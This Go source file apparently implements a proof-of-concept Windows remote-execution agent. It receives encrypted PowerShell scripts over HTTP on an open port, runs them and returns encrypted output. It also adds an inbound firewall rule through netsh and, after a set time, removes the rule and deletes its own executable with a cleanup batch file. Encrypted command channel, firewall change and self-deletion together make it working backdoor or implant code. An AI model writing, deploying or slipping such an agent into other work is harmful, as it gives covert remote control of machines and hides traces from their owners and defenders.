package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"time"
)

var (
	portFlag = flag.Int("port", 8443, "Port to listen on")
	ttlFlag  = flag.Int("ttl", 3600, "Time to live in seconds")
	pskFlag  = flag.String("psk", "", "Pre-shared key")
)

// getAESKey ensures the key is exactly 32 bytes for AES-256
func getAESKey(psk string) []byte {
	key := make([]byte, 32)
	copy(key, psk)
	return key
}

func encrypt(plaintext []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
	return ciphertext, nil
}

func decrypt(ciphertext []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

type ExecRequest struct {
	Script string `json:"script"`
}

type ExecResponse struct {
	Stdout   string `json:"stdout"`
	Stderr   string `json:"stderr"`
	ExitCode int    `json:"exit_code"`
}

func executeHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Error reading body", http.StatusBadRequest)
		return
	}

	key := getAESKey(*pskFlag)
	plaintext, err := decrypt(body, key)
	if err != nil {
		http.Error(w, "Decryption failed", http.StatusForbidden)
		return
	}

	var req ExecRequest
	if err := json.Unmarshal(plaintext, &req); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	// Execute PowerShell
	cmd := exec.Command("powershell.exe", "-NonInteractive", "-NoProfile", "-Command", req.Script)
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err = cmd.Run()
	exitCode := 0
	if err != nil {
		if exitError, ok := err.(*exec.ExitError); ok {
			exitCode = exitError.ExitCode()
		} else {
			exitCode = -1
		}
	}

	resp := ExecResponse{
		Stdout:   stdout.String(),
		Stderr:   stderr.String(),
		ExitCode: exitCode,
	}

	respJSON, _ := json.Marshal(resp)
	ciphertext, err := encrypt(respJSON, key)
	if err != nil {
		http.Error(w, "Encryption failed", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Write(ciphertext)
}

func pingHandler(w http.ResponseWriter, r *http.Request) {
	w.Write([]byte("PONG"))
}

func manageFirewall(port int, add bool) {
	var cmd *exec.Cmd
	if add {
		cmd = exec.Command("netsh", "advfirewall", "firewall", "add", "rule",
			"name=JASS-Prober", "dir=in", "action=allow", "protocol=TCP", fmt.Sprintf("localport=%d", port))
	} else {
		cmd = exec.Command("netsh", "advfirewall", "firewall", "delete", "rule", "name=JASS-Prober")
	}
	cmd.Run() // Ignore errors for PoC (e.g. lack of admin rights)
}

func selfDestruct() {
	exePath, _ := os.Executable()
	batPath := filepath.Join(os.TempDir(), "jass_cleanup.bat")
	batContent := fmt.Sprintf("@echo off\ntimeout /t 2 /nobreak > NUL\ndel \"%s\"\ndel \"%%~f0\"\n", exePath)
	os.WriteFile(batPath, []byte(batContent), 0644)
	exec.Command("cmd.exe", "/c", batPath).Start()
}

func main() {
	flag.Parse()

	if *pskFlag == "" {
		log.Fatal("PSK is required")
	}

	manageFirewall(*portFlag, true)

	go func() {
		time.Sleep(time.Duration(*ttlFlag) * time.Second)
		manageFirewall(*portFlag, false)
		selfDestruct()
		os.Exit(0)
	}()

	http.HandleFunc("/execute", executeHandler)
	http.HandleFunc("/ping", pingHandler)

	addr := fmt.Sprintf("0.0.0.0:%d", *portFlag)
	log.Printf("Listening on %s (TTL: %ds)\n", addr, *ttlFlag)
	if err := http.ListenAndServe(addr, nil); err != nil {
		log.Fatal(err)
	}
}

